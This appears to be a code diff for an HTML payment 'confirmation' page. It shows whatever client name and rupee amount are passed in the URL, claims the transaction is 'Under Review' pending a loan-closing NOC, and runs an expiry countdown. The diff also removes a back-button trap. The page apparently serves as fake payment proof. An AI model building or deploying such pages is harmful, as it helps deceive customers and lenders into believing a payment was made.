@@ -8,10 +8,9 @@
 <style>
 .fade-out { animation: fadeOut 3s forwards; }
 @keyframes fadeOut { from {opacity:1;} to {opacity:0;} }
-button:disabled, a:disabled { opacity:0.5; cursor:not-allowed; pointer-events:none; }
 </style>
 </head>
-<body class="bg-gradient-to-r from-purple-50 to-indigo-50 min-h-screen flex flex-col items-center justify-center p-4">
+<body class="bg-gradient-to-r from-indigo-50 to-purple-50 min-h-screen flex flex-col items-center justify-center p-4">
 
 <div id="confirmationContainer" class="max-w-md w-full bg-white rounded-3xl shadow-2xl p-8 border border-gray-200 text-center">
 
@@ -23,18 +22,21 @@ button:disabled, a:disabled { opacity:0.5; cursor:not-allowed; pointer-events:no
     <div class="text-white font-medium text-lg">Time Left: <span id="timer">09:00</span></div>
   </div>
 
-  <div id="confirmationMessage" class="text-gray-700 text-lg font-semibold">
-    <!-- Dynamic confirmation message -->
+  <p id="clientName" class="text-xl font-semibold text-gray-700 mb-2"></p>
+  <p id="amount" class="text-2xl font-bold text-green-600 mb-4"></p>
+
+  <div class="mt-6 p-4 bg-green-100 text-green-800 rounded-2xl shadow text-left">
+    Dear <span id="clientSpan"></span>, your transaction is <strong>Under Review</strong>. After confirmation, you will receive the NOC for loan closing.
   </div>
+
 </div>
 
 <div id="expiredContainer" class="hidden w-full max-w-md bg-white rounded-3xl shadow-2xl p-8 border border-gray-200 text-center">
   <h1 class="text-3xl font-bold text-red-600 mb-4">Page Expired</h1>
-  <p class="text-gray-700">Your payment session has timed out. Please generate a new link to complete the transaction.</p>
+  <p class="text-gray-700">Your session has expired. Please generate a new link to complete the transaction.</p>
 </div>
 
 <script>
-// Get parameters from URL
 const params = new URLSearchParams(window.location.search);
 const app = params.get('app') || 'Payment';
 const client = params.get('pn') || 'Customer';
@@ -42,8 +44,9 @@ const amount = params.get('am') || '0';
 const expiryParam = params.get('expiry');
 
 document.getElementById('appName').innerText = decodeURIComponent(app);
-document.getElementById('confirmationMessage').innerText = 
-`Dear "${decodeURIComponent(client)}", your ₹${decodeURIComponent(amount)} transaction is Under Review. After confirmation, you will receive the NOC of loan closing.`;
+document.getElementById('clientName').innerText = decodeURIComponent(client);
+document.getElementById('amount').innerText = `₹${decodeURIComponent(amount)}`;
+document.getElementById('clientSpan').innerText = decodeURIComponent(client);
 
 // Countdown timer
 const timerElement = document.getElementById('timer');
@@ -62,12 +65,6 @@ const countdown = setInterval(() => {
   const seconds = remaining % 60;
   timerElement.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
 }, 1000);
-
-// Prevent back navigation to payment page
-history.pushState(null, document.title, location.href);
-window.addEventListener('popstate', function () {
-    history.pushState(null, document.title, location.href);
-});
 </script>
 </body>
 </html>
